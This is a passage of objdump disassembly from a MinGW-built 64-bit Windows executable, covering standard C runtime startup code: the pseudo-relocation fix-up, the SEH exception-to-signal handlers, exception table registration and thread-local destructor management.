  40774d:	0f 85 2d ff ff ff    	jne    407680 <_pei386_runtime_relocator+0xa0>
  407753:	8b 56 08             	mov    0x8(%rsi),%edx
  407756:	83 fa 01             	cmp    $0x1,%edx
  407759:	0f 85 2f 01 00 00    	jne    40788e <_pei386_runtime_relocator+0x2ae>
  40775f:	4c 8b 2d 5a a5 00 00 	mov    0xa55a(%rip),%r13        # 411cc0 <.refptr.__image_base__>
  407766:	48 83 c6 0c          	add    $0xc,%rsi
  40776a:	49 bf 00 00 00 00 ff 	movabs $0xffffffff00000000,%r15
  407771:	ff ff ff 
  407774:	4c 8d 75 a8          	lea    -0x58(%rbp),%r14
  407778:	4c 39 e6             	cmp    %r12,%rsi
  40777b:	72 48                	jb     4077c5 <_pei386_runtime_relocator+0x1e5>
  40777d:	e9 80 fe ff ff       	jmp    407602 <_pei386_runtime_relocator+0x22>
  407782:	0f 86 b8 00 00 00    	jbe    407840 <_pei386_runtime_relocator+0x260>
  407788:	83 fa 20             	cmp    $0x20,%edx
  40778b:	0f 84 7f 00 00 00    	je     407810 <_pei386_runtime_relocator+0x230>
  407791:	83 fa 40             	cmp    $0x40,%edx
  407794:	0f 85 e0 00 00 00    	jne    40787a <_pei386_runtime_relocator+0x29a>
  40779a:	48 8b 11             	mov    (%rcx),%rdx
  40779d:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  4077a3:	4c 89 f7             	mov    %r14,%rdi
  4077a6:	48 29 c2             	sub    %rax,%rdx
  4077a9:	4c 01 ca             	add    %r9,%rdx
  4077ac:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
  4077b0:	4c 89 f2             	mov    %r14,%rdx
  4077b3:	e8 58 fc ff ff       	call   407410 <__write_memory.part.0>
  4077b8:	48 83 c6 0c          	add    $0xc,%rsi
  4077bc:	4c 39 e6             	cmp    %r12,%rsi
  4077bf:	0f 83 12 ff ff ff    	jae    4076d7 <_pei386_runtime_relocator+0xf7>
  4077c5:	8b 4e 04             	mov    0x4(%rsi),%ecx
  4077c8:	8b 06                	mov    (%rsi),%eax
  4077ca:	0f b6 56 08          	movzbl 0x8(%rsi),%edx
  4077ce:	4c 01 e9             	add    %r13,%rcx
  4077d1:	4c 01 e8             	add    %r13,%rax
  4077d4:	83 fa 10             	cmp    $0x10,%edx
  4077d7:	4c 8b 08             	mov    (%rax),%r9
  4077da:	75 a6                	jne    407782 <_pei386_runtime_relocator+0x1a2>
  4077dc:	44 0f b7 01          	movzwl (%rcx),%r8d
  4077e0:	4c 89 f2             	mov    %r14,%rdx
  4077e3:	4c 89 f7             	mov    %r14,%rdi
  4077e6:	4d 89 c2             	mov    %r8,%r10
  4077e9:	49 81 ca 00 00 ff ff 	or     $0xffffffffffff0000,%r10
  4077f0:	66 45 85 c0          	test   %r8w,%r8w
  4077f4:	4d 0f 48 c2          	cmovs  %r10,%r8
  4077f8:	49 29 c0             	sub    %rax,%r8
  4077fb:	4d 01 c8             	add    %r9,%r8
  4077fe:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
  407802:	41 b8 02 00 00 00    	mov    $0x2,%r8d
  407808:	e8 03 fc ff ff       	call   407410 <__write_memory.part.0>
  40780d:	eb a9                	jmp    4077b8 <_pei386_runtime_relocator+0x1d8>
  40780f:	90                   	nop
  407810:	8b 11                	mov    (%rcx),%edx
  407812:	4c 89 f7             	mov    %r14,%rdi
  407815:	49 89 d0             	mov    %rdx,%r8
  407818:	4c 09 fa             	or     %r15,%rdx
  40781b:	45 85 c0             	test   %r8d,%r8d
  40781e:	49 0f 49 d0          	cmovns %r8,%rdx
  407822:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  407828:	48 29 c2             	sub    %rax,%rdx
  40782b:	4c 01 ca             	add    %r9,%rdx
  40782e:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
  407832:	4c 89 f2             	mov    %r14,%rdx
  407835:	e8 d6 fb ff ff       	call   407410 <__write_memory.part.0>
  40783a:	e9 79 ff ff ff       	jmp    4077b8 <_pei386_runtime_relocator+0x1d8>
  40783f:	90                   	nop
  407840:	83 fa 08             	cmp    $0x8,%edx
  407843:	75 35                	jne    40787a <_pei386_runtime_relocator+0x29a>
  407845:	44 0f b6 01          	movzbl (%rcx),%r8d
  407849:	4c 89 f2             	mov    %r14,%rdx
  40784c:	4c 89 f7             	mov    %r14,%rdi
  40784f:	4d 89 c2             	mov    %r8,%r10
  407852:	49 81 ca 00 ff ff ff 	or     $0xffffffffffffff00,%r10
  407859:	45 84 c0             	test   %r8b,%r8b
  40785c:	4d 0f 48 c2          	cmovs  %r10,%r8
  407860:	49 29 c0             	sub    %rax,%r8
  407863:	4d 01 c8             	add    %r9,%r8
  407866:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
  40786a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  407870:	e8 9b fb ff ff       	call   407410 <__write_memory.part.0>
  407875:	e9 3e ff ff ff       	jmp    4077b8 <_pei386_runtime_relocator+0x1d8>
  40787a:	48 8d 0d 97 a3 00 00 	lea    0xa397(%rip),%rcx        # 411c18 <.rdata+0xd8>
  407881:	48 c7 45 a8 00 00 00 	movq   $0x0,-0x58(%rbp)
  407888:	00 
  407889:	e8 c2 28 00 00       	call   40a150 <__report_error>
  40788e:	48 8d 0d 4b a3 00 00 	lea    0xa34b(%rip),%rcx        # 411be0 <.rdata+0xa0>
  407895:	e8 b6 28 00 00       	call   40a150 <__report_error>
  40789a:	90                   	nop
  40789b:	90                   	nop
  40789c:	90                   	nop
  40789d:	90                   	nop
  40789e:	90                   	nop
  40789f:	90                   	nop

00000000004078a0 <__mingw_SEH_error_handler>:
  4078a0:	48 83 ec 28          	sub    $0x28,%rsp
  4078a4:	8b 01                	mov    (%rcx),%eax
  4078a6:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  4078ab:	77 63                	ja     407910 <__mingw_SEH_error_handler+0x70>
  4078ad:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  4078b2:	73 7b                	jae    40792f <__mingw_SEH_error_handler+0x8f>
  4078b4:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  4078b9:	0f 84 05 01 00 00    	je     4079c4 <__mingw_SEH_error_handler+0x124>
  4078bf:	0f 87 cb 00 00 00    	ja     407990 <__mingw_SEH_error_handler+0xf0>
  4078c5:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  4078ca:	0f 84 f4 00 00 00    	je     4079c4 <__mingw_SEH_error_handler+0x124>
  4078d0:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  4078d5:	0f 85 c3 00 00 00    	jne    40799e <__mingw_SEH_error_handler+0xfe>
  4078db:	31 d2                	xor    %edx,%edx
  4078dd:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4078e2:	e8 f9 0a 00 00       	call   4083e0 <signal>
  4078e7:	48 83 f8 01          	cmp    $0x1,%rax
  4078eb:	0f 84 2f 01 00 00    	je     407a20 <__mingw_SEH_error_handler+0x180>
  4078f1:	48 85 c0             	test   %rax,%rax
  4078f4:	0f 84 3c 01 00 00    	je     407a36 <__mingw_SEH_error_handler+0x196>
  4078fa:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4078ff:	ff d0                	call   *%rax
  407901:	31 c0                	xor    %eax,%eax
  407903:	48 83 c4 28          	add    $0x28,%rsp
  407907:	c3                   	ret
  407908:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40790f:	00 
  407910:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  407915:	0f 84 b5 00 00 00    	je     4079d0 <__mingw_SEH_error_handler+0x130>
  40791b:	77 37                	ja     407954 <__mingw_SEH_error_handler+0xb4>
  40791d:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  407922:	0f 84 9c 00 00 00    	je     4079c4 <__mingw_SEH_error_handler+0x124>
  407928:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  40792d:	75 6f                	jne    40799e <__mingw_SEH_error_handler+0xfe>
  40792f:	31 d2                	xor    %edx,%edx
  407931:	b9 08 00 00 00       	mov    $0x8,%ecx
  407936:	e8 a5 0a 00 00       	call   4083e0 <signal>
  40793b:	48 83 f8 01          	cmp    $0x1,%rax
  40793f:	74 6f                	je     4079b0 <__mingw_SEH_error_handler+0x110>
  407941:	48 85 c0             	test   %rax,%rax
  407944:	74 58                	je     40799e <__mingw_SEH_error_handler+0xfe>
  407946:	b9 08 00 00 00       	mov    $0x8,%ecx
  40794b:	ff d0                	call   *%rax
  40794d:	31 c0                	xor    %eax,%eax
  40794f:	48 83 c4 28          	add    $0x28,%rsp
  407953:	c3                   	ret
  407954:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
  407959:	74 69                	je     4079c4 <__mingw_SEH_error_handler+0x124>
  40795b:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  407960:	75 3c                	jne    40799e <__mingw_SEH_error_handler+0xfe>
  407962:	31 d2                	xor    %edx,%edx
  407964:	b9 04 00 00 00       	mov    $0x4,%ecx
  407969:	e8 72 0a 00 00       	call   4083e0 <signal>
  40796e:	48 83 f8 01          	cmp    $0x1,%rax
  407972:	0f 84 88 00 00 00    	je     407a00 <__mingw_SEH_error_handler+0x160>
  407978:	48 85 c0             	test   %rax,%rax
  40797b:	0f 84 b5 00 00 00    	je     407a36 <__mingw_SEH_error_handler+0x196>
  407981:	b9 04 00 00 00       	mov    $0x4,%ecx
  407986:	ff d0                	call   *%rax
  407988:	31 c0                	xor    %eax,%eax
  40798a:	48 83 c4 28          	add    $0x28,%rsp
  40798e:	c3                   	ret
  40798f:	90                   	nop
  407990:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  407995:	74 cb                	je     407962 <__mingw_SEH_error_handler+0xc2>
  407997:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
  40799c:	74 26                	je     4079c4 <__mingw_SEH_error_handler+0x124>
  40799e:	b8 01 00 00 00       	mov    $0x1,%eax
  4079a3:	48 83 c4 28          	add    $0x28,%rsp
  4079a7:	c3                   	ret
  4079a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4079af:	00 
  4079b0:	ba 01 00 00 00       	mov    $0x1,%edx
  4079b5:	b9 08 00 00 00       	mov    $0x8,%ecx
  4079ba:	e8 21 0a 00 00       	call   4083e0 <signal>
  4079bf:	e8 1c fa ff ff       	call   4073e0 <_fpreset>
  4079c4:	31 c0                	xor    %eax,%eax
  4079c6:	48 83 c4 28          	add    $0x28,%rsp
  4079ca:	c3                   	ret
  4079cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4079d0:	31 d2                	xor    %edx,%edx
  4079d2:	b9 08 00 00 00       	mov    $0x8,%ecx
  4079d7:	e8 04 0a 00 00       	call   4083e0 <signal>
  4079dc:	48 83 f8 01          	cmp    $0x1,%rax
  4079e0:	0f 85 5b ff ff ff    	jne    407941 <__mingw_SEH_error_handler+0xa1>
  4079e6:	ba 01 00 00 00       	mov    $0x1,%edx
  4079eb:	b9 08 00 00 00       	mov    $0x8,%ecx
  4079f0:	e8 eb 09 00 00       	call   4083e0 <signal>
  4079f5:	31 c0                	xor    %eax,%eax
  4079f7:	e9 07 ff ff ff       	jmp    407903 <__mingw_SEH_error_handler+0x63>
  4079fc:	0f 1f 40 00          	nopl   0x0(%rax)
  407a00:	ba 01 00 00 00       	mov    $0x1,%edx
  407a05:	b9 04 00 00 00       	mov    $0x4,%ecx
  407a0a:	e8 d1 09 00 00       	call   4083e0 <signal>
  407a0f:	31 c0                	xor    %eax,%eax
  407a11:	e9 ed fe ff ff       	jmp    407903 <__mingw_SEH_error_handler+0x63>
  407a16:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  407a1d:	00 00 00 
  407a20:	ba 01 00 00 00       	mov    $0x1,%edx
  407a25:	b9 0b 00 00 00       	mov    $0xb,%ecx
  407a2a:	e8 b1 09 00 00       	call   4083e0 <signal>
  407a2f:	31 c0                	xor    %eax,%eax
  407a31:	e9 cd fe ff ff       	jmp    407903 <__mingw_SEH_error_handler+0x63>
  407a36:	b8 04 00 00 00       	mov    $0x4,%eax
  407a3b:	e9 c3 fe ff ff       	jmp    407903 <__mingw_SEH_error_handler+0x63>

0000000000407a40 <__mingw_init_ehandler>:
  407a40:	41 54                	push   %r12
  407a42:	55                   	push   %rbp
  407a43:	57                   	push   %rdi
  407a44:	56                   	push   %rsi
  407a45:	53                   	push   %rbx
  407a46:	48 83 ec 20          	sub    $0x20,%rsp
  407a4a:	e8 91 07 00 00       	call   4081e0 <_GetPEImageBase>
  407a4f:	48 89 c5             	mov    %rax,%rbp
  407a52:	8b 05 f0 6d 02 00    	mov    0x26df0(%rip),%eax        # 42e848 <was_here.95013>
  407a58:	85 c0                	test   %eax,%eax
  407a5a:	75 25                	jne    407a81 <__mingw_init_ehandler+0x41>
  407a5c:	48 85 ed             	test   %rbp,%rbp
  407a5f:	74 20                	je     407a81 <__mingw_init_ehandler+0x41>
  407a61:	48 8d 0d e8 a1 00 00 	lea    0xa1e8(%rip),%rcx        # 411c50 <.rdata>
  407a68:	c7 05 d6 6d 02 00 01 	movl   $0x1,0x26dd6(%rip)        # 42e848 <was_here.95013>
  407a6f:	00 00 00 
  407a72:	e8 a9 05 00 00       	call   408020 <_FindPESectionByName>
  407a77:	48 85 c0             	test   %rax,%rax
  407a7a:	74 14                	je     407a90 <__mingw_init_ehandler+0x50>
  407a7c:	b8 01 00 00 00       	mov    $0x1,%eax
  407a81:	48 83 c4 20          	add    $0x20,%rsp
  407a85:	5b                   	pop    %rbx
  407a86:	5e                   	pop    %rsi
  407a87:	5f                   	pop    %rdi
  407a88:	5d                   	pop    %rbp
  407a89:	41 5c                	pop    %r12
  407a8b:	c3                   	ret
  407a8c:	0f 1f 40 00          	nopl   0x0(%rax)
  407a90:	48 8d 1d c9 6e 02 00 	lea    0x26ec9(%rip),%rbx        # 42e960 <emu_pdata>
  407a97:	b9 30 00 00 00       	mov    $0x30,%ecx
  407a9c:	31 f6                	xor    %esi,%esi
  407a9e:	48 8d 15 bb 6d 02 00 	lea    0x26dbb(%rip),%rdx        # 42e860 <emu_xdata>
  407aa5:	48 89 df             	mov    %rbx,%rdi
  407aa8:	f3 48 ab             	rep stos %rax,(%rdi)
  407aab:	4c 8d 25 ee fd ff ff 	lea    -0x212(%rip),%r12        # 4078a0 <__mingw_SEH_error_handler>
  407ab2:	b9 20 00 00 00       	mov    $0x20,%ecx
  407ab7:	48 89 d7             	mov    %rdx,%rdi
  407aba:	f3 48 ab             	rep stos %rax,(%rdi)
  407abd:	49 29 ec             	sub    %rbp,%r12
  407ac0:	48 89 d7             	mov    %rdx,%rdi
  407ac3:	eb 2e                	jmp    407af3 <__mingw_init_ehandler+0xb3>
  407ac5:	c6 07 09             	movb   $0x9,(%rdi)
  407ac8:	48 83 c6 01          	add    $0x1,%rsi
  407acc:	48 83 c3 0c          	add    $0xc,%rbx
  407ad0:	44 89 67 04          	mov    %r12d,0x4(%rdi)
  407ad4:	8b 48 0c             	mov    0xc(%rax),%ecx
  407ad7:	89 4b f4             	mov    %ecx,-0xc(%rbx)
  407ada:	03 48 08             	add    0x8(%rax),%ecx
  407add:	48 89 f8             	mov    %rdi,%rax
  407ae0:	48 83 c7 08          	add    $0x8,%rdi
  407ae4:	48 29 e8             	sub    %rbp,%rax
  407ae7:	89 43 fc             	mov    %eax,-0x4(%rbx)
  407aea:	89 4b f8             	mov    %ecx,-0x8(%rbx)
  407aed:	48 83 fe 20          	cmp    $0x20,%rsi
  407af1:	74 32                	je     407b25 <__mingw_init_ehandler+0xe5>
  407af3:	48 89 f1             	mov    %rsi,%rcx
  407af6:	e8 75 06 00 00       	call   408170 <_FindPESectionExec>
  407afb:	48 85 c0             	test   %rax,%rax
  407afe:	75 c5                	jne    407ac5 <__mingw_init_ehandler+0x85>
  407b00:	48 85 f6             	test   %rsi,%rsi
  407b03:	89 f2                	mov    %esi,%edx
  407b05:	0f 84 71 ff ff ff    	je     407a7c <__mingw_init_ehandler+0x3c>
  407b0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  407b10:	48 8d 0d 49 6e 02 00 	lea    0x26e49(%rip),%rcx        # 42e960 <emu_pdata>
  407b17:	49 89 e8             	mov    %rbp,%r8
  407b1a:	ff 15 b4 07 04 00    	call   *0x407b4(%rip)        # 4482d4 <__imp_RtlAddFunctionTable>
  407b20:	e9 57 ff ff ff       	jmp    407a7c <__mingw_init_ehandler+0x3c>
  407b25:	ba 20 00 00 00       	mov    $0x20,%edx
  407b2a:	eb e4                	jmp    407b10 <__mingw_init_ehandler+0xd0>
  407b2c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000407b30 <_gnu_exception_handler>:
  407b30:	53                   	push   %rbx
  407b31:	48 83 ec 20          	sub    $0x20,%rsp
  407b35:	48 8b 11             	mov    (%rcx),%rdx
  407b38:	8b 02                	mov    (%rdx),%eax
  407b3a:	48 89 cb             	mov    %rcx,%rbx
  407b3d:	89 c1                	mov    %eax,%ecx
  407b3f:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
  407b45:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
  407b4b:	0f 84 bf 00 00 00    	je     407c10 <_gnu_exception_handler+0xe0>
  407b51:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  407b56:	77 68                	ja     407bc0 <_gnu_exception_handler+0x90>
  407b58:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  407b5d:	73 7c                	jae    407bdb <_gnu_exception_handler+0xab>
  407b5f:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  407b64:	0f 84 b0 00 00 00    	je     407c1a <_gnu_exception_handler+0xea>
  407b6a:	0f 87 f4 00 00 00    	ja     407c64 <_gnu_exception_handler+0x134>
  407b70:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  407b75:	0f 84 9f 00 00 00    	je     407c1a <_gnu_exception_handler+0xea>
  407b7b:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  407b80:	75 1f                	jne    407ba1 <_gnu_exception_handler+0x71>
  407b82:	31 d2                	xor    %edx,%edx
  407b84:	b9 0b 00 00 00       	mov    $0xb,%ecx
  407b89:	e8 52 08 00 00       	call   4083e0 <signal>
  407b8e:	48 83 f8 01          	cmp    $0x1,%rax
  407b92:	0f 84 51 01 00 00    	je     407ce9 <_gnu_exception_handler+0x1b9>
  407b98:	48 85 c0             	test   %rax,%rax
  407b9b:	0f 85 0f 01 00 00    	jne    407cb0 <_gnu_exception_handler+0x180>
  407ba1:	48 8b 05 98 6c 02 00 	mov    0x26c98(%rip),%rax        # 42e840 <__mingw_oldexcpt_handler>
  407ba8:	48 85 c0             	test   %rax,%rax
  407bab:	0f 84 10 01 00 00    	je     407cc1 <_gnu_exception_handler+0x191>
  407bb1:	48 89 d9             	mov    %rbx,%rcx
  407bb4:	48 83 c4 20          	add    $0x20,%rsp
  407bb8:	5b                   	pop    %rbx
  407bb9:	48 ff e0             	rex.W jmp *%rax
  407bbc:	0f 1f 40 00          	nopl   0x0(%rax)
  407bc0:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  407bc5:	0f 84 b5 00 00 00    	je     407c80 <_gnu_exception_handler+0x150>
  407bcb:	77 58                	ja     407c25 <_gnu_exception_handler+0xf5>
  407bcd:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  407bd2:	74 46                	je     407c1a <_gnu_exception_handler+0xea>
  407bd4:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  407bd9:	75 c6                	jne    407ba1 <_gnu_exception_handler+0x71>
  407bdb:	31 d2                	xor    %edx,%edx
  407bdd:	b9 08 00 00 00       	mov    $0x8,%ecx
  407be2:	e8 f9 07 00 00       	call   4083e0 <signal>
  407be7:	48 83 f8 01          	cmp    $0x1,%rax
  407beb:	0f 84 df 00 00 00    	je     407cd0 <_gnu_exception_handler+0x1a0>
  407bf1:	48 85 c0             	test   %rax,%rax
  407bf4:	74 ab                	je     407ba1 <_gnu_exception_handler+0x71>
  407bf6:	b9 08 00 00 00       	mov    $0x8,%ecx
  407bfb:	ff d0                	call   *%rax
  407bfd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  407c02:	48 83 c4 20          	add    $0x20,%rsp
  407c06:	5b                   	pop    %rbx
  407c07:	c3                   	ret
  407c08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  407c0f:	00 
  407c10:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
  407c14:	0f 85 37 ff ff ff    	jne    407b51 <_gnu_exception_handler+0x21>
  407c1a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  407c1f:	48 83 c4 20          	add    $0x20,%rsp
  407c23:	5b                   	pop    %rbx
  407c24:	c3                   	ret
  407c25:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
  407c2a:	74 ee                	je     407c1a <_gnu_exception_handler+0xea>
  407c2c:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  407c31:	0f 85 6a ff ff ff    	jne    407ba1 <_gnu_exception_handler+0x71>
  407c37:	31 d2                	xor    %edx,%edx
  407c39:	b9 04 00 00 00       	mov    $0x4,%ecx
  407c3e:	e8 9d 07 00 00       	call   4083e0 <signal>
  407c43:	48 83 f8 01          	cmp    $0x1,%rax
  407c47:	0f 84 b3 00 00 00    	je     407d00 <_gnu_exception_handler+0x1d0>
  407c4d:	48 85 c0             	test   %rax,%rax
  407c50:	0f 84 4b ff ff ff    	je     407ba1 <_gnu_exception_handler+0x71>
  407c56:	b9 04 00 00 00       	mov    $0x4,%ecx
  407c5b:	ff d0                	call   *%rax
  407c5d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  407c62:	eb 9e                	jmp    407c02 <_gnu_exception_handler+0xd2>
  407c64:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  407c69:	74 cc                	je     407c37 <_gnu_exception_handler+0x107>
  407c6b:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
  407c70:	0f 85 2b ff ff ff    	jne    407ba1 <_gnu_exception_handler+0x71>
  407c76:	eb a2                	jmp    407c1a <_gnu_exception_handler+0xea>
  407c78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  407c7f:	00 
  407c80:	31 d2                	xor    %edx,%edx
  407c82:	b9 08 00 00 00       	mov    $0x8,%ecx
  407c87:	e8 54 07 00 00       	call   4083e0 <signal>
  407c8c:	48 83 f8 01          	cmp    $0x1,%rax
  407c90:	0f 85 5b ff ff ff    	jne    407bf1 <_gnu_exception_handler+0xc1>
  407c96:	ba 01 00 00 00       	mov    $0x1,%edx
  407c9b:	b9 08 00 00 00       	mov    $0x8,%ecx
  407ca0:	e8 3b 07 00 00       	call   4083e0 <signal>
  407ca5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  407caa:	e9 53 ff ff ff       	jmp    407c02 <_gnu_exception_handler+0xd2>
  407caf:	90                   	nop
  407cb0:	b9 0b 00 00 00       	mov    $0xb,%ecx
  407cb5:	ff d0                	call   *%rax
  407cb7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  407cbc:	e9 41 ff ff ff       	jmp    407c02 <_gnu_exception_handler+0xd2>
  407cc1:	31 c0                	xor    %eax,%eax
  407cc3:	e9 3a ff ff ff       	jmp    407c02 <_gnu_exception_handler+0xd2>
  407cc8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  407ccf:	00 
  407cd0:	ba 01 00 00 00       	mov    $0x1,%edx
  407cd5:	b9 08 00 00 00       	mov    $0x8,%ecx
  407cda:	e8 01 07 00 00       	call   4083e0 <signal>
  407cdf:	e8 fc f6 ff ff       	call   4073e0 <_fpreset>
  407ce4:	e9 31 ff ff ff       	jmp    407c1a <_gnu_exception_handler+0xea>
  407ce9:	ba 01 00 00 00       	mov    $0x1,%edx
  407cee:	b9 0b 00 00 00       	mov    $0xb,%ecx
  407cf3:	e8 e8 06 00 00       	call   4083e0 <signal>
  407cf8:	83 c8 ff             	or     $0xffffffff,%eax
  407cfb:	e9 02 ff ff ff       	jmp    407c02 <_gnu_exception_handler+0xd2>
  407d00:	ba 01 00 00 00       	mov    $0x1,%edx
  407d05:	b9 04 00 00 00       	mov    $0x4,%ecx
  407d0a:	e8 d1 06 00 00       	call   4083e0 <signal>
  407d0f:	83 c8 ff             	or     $0xffffffff,%eax
  407d12:	e9 eb fe ff ff       	jmp    407c02 <_gnu_exception_handler+0xd2>
  407d17:	90                   	nop
  407d18:	90                   	nop
  407d19:	90                   	nop
  407d1a:	90                   	nop
  407d1b:	90                   	nop
  407d1c:	90                   	nop
  407d1d:	90                   	nop
  407d1e:	90                   	nop
  407d1f:	90                   	nop

0000000000407d20 <__mingwthr_run_key_dtors.part.0>:
  407d20:	55                   	push   %rbp
  407d21:	57                   	push   %rdi
  407d22:	56                   	push   %rsi
  407d23:	53                   	push   %rbx
  407d24:	48 83 ec 28          	sub    $0x28,%rsp
  407d28:	48 8d 0d d1 6d 02 00 	lea    0x26dd1(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407d2f:	ff 15 37 05 04 00    	call   *0x40537(%rip)        # 44826c <__imp_EnterCriticalSection>
  407d35:	48 8b 1d a4 6d 02 00 	mov    0x26da4(%rip),%rbx        # 42eae0 <key_dtor_list>
  407d3c:	48 85 db             	test   %rbx,%rbx
  407d3f:	74 33                	je     407d74 <__mingwthr_run_key_dtors.part.0+0x54>
  407d41:	48 8b 2d d4 05 04 00 	mov    0x405d4(%rip),%rbp        # 44831c <__imp_TlsGetValue>
  407d48:	48 8b 3d 3d 05 04 00 	mov    0x4053d(%rip),%rdi        # 44828c <__imp_GetLastError>
  407d4f:	90                   	nop
  407d50:	8b 0b                	mov    (%rbx),%ecx
  407d52:	ff d5                	call   *%rbp
  407d54:	48 89 c6             	mov    %rax,%rsi
  407d57:	ff d7                	call   *%rdi
  407d59:	85 c0                	test   %eax,%eax
  407d5b:	75 0e                	jne    407d6b <__mingwthr_run_key_dtors.part.0+0x4b>
  407d5d:	48 85 f6             	test   %rsi,%rsi
  407d60:	74 09                	je     407d6b <__mingwthr_run_key_dtors.part.0+0x4b>
  407d62:	48 8b 43 08          	mov    0x8(%rbx),%rax
  407d66:	48 89 f1             	mov    %rsi,%rcx
  407d69:	ff d0                	call   *%rax
  407d6b:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
  407d6f:	48 85 db             	test   %rbx,%rbx
  407d72:	75 dc                	jne    407d50 <__mingwthr_run_key_dtors.part.0+0x30>
  407d74:	48 8d 0d 85 6d 02 00 	lea    0x26d85(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407d7b:	48 83 c4 28          	add    $0x28,%rsp
  407d7f:	5b                   	pop    %rbx
  407d80:	5e                   	pop    %rsi
  407d81:	5f                   	pop    %rdi
  407d82:	5d                   	pop    %rbp
  407d83:	48 ff 25 32 05 04 00 	rex.W jmp *0x40532(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  407d8a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000407d90 <___w64_mingwthr_add_key_dtor>:
  407d90:	55                   	push   %rbp
  407d91:	57                   	push   %rdi
  407d92:	56                   	push   %rsi
  407d93:	53                   	push   %rbx
  407d94:	48 83 ec 28          	sub    $0x28,%rsp
  407d98:	8b 05 4a 6d 02 00    	mov    0x26d4a(%rip),%eax        # 42eae8 <__mingwthr_cs_init>
  407d9e:	31 f6                	xor    %esi,%esi
  407da0:	85 c0                	test   %eax,%eax
  407da2:	89 cd                	mov    %ecx,%ebp
  407da4:	48 89 d7             	mov    %rdx,%rdi
  407da7:	75 0b                	jne    407db4 <___w64_mingwthr_add_key_dtor+0x24>
  407da9:	89 f0                	mov    %esi,%eax
  407dab:	48 83 c4 28          	add    $0x28,%rsp
  407daf:	5b                   	pop    %rbx
  407db0:	5e                   	pop    %rsi
  407db1:	5f                   	pop    %rdi
  407db2:	5d                   	pop    %rbp
  407db3:	c3                   	ret
  407db4:	ba 18 00 00 00       	mov    $0x18,%edx
  407db9:	b9 01 00 00 00       	mov    $0x1,%ecx
  407dbe:	e8 65 06 00 00       	call   408428 <calloc>
  407dc3:	48 85 c0             	test   %rax,%rax
  407dc6:	48 89 c3             	mov    %rax,%rbx
  407dc9:	74 3d                	je     407e08 <___w64_mingwthr_add_key_dtor+0x78>
  407dcb:	89 28                	mov    %ebp,(%rax)
  407dcd:	48 8d 0d 2c 6d 02 00 	lea    0x26d2c(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407dd4:	48 89 78 08          	mov    %rdi,0x8(%rax)
  407dd8:	ff 15 8e 04 04 00    	call   *0x4048e(%rip)        # 44826c <__imp_EnterCriticalSection>
  407dde:	48 8b 05 fb 6c 02 00 	mov    0x26cfb(%rip),%rax        # 42eae0 <key_dtor_list>
  407de5:	48 8d 0d 14 6d 02 00 	lea    0x26d14(%rip),%rcx        # 42eb00 <__mingwthr_cs>
  407dec:	48 89 1d ed 6c 02 00 	mov    %rbx,0x26ced(%rip)        # 42eae0 <key_dtor_list>
  407df3:	48 89 43 10          	mov    %rax,0x10(%rbx)
  407df7:	ff 15 bf 04 04 00    	call   *0x404bf(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  407dfd:	89 f0                	mov    %esi,%eax
  407dff:	48 83 c4 28          	add    $0x28,%rsp
  407e03:	5b                   	pop    %rbx
  407e04:	5e                   	pop    %rsi
  407e05:	5f                   	pop    %rdi
  407e06:	5d                   	pop    %rbp
  407e07:	c3                   	ret
  407e08:	be ff ff ff ff       	mov    $0xffffffff,%esi
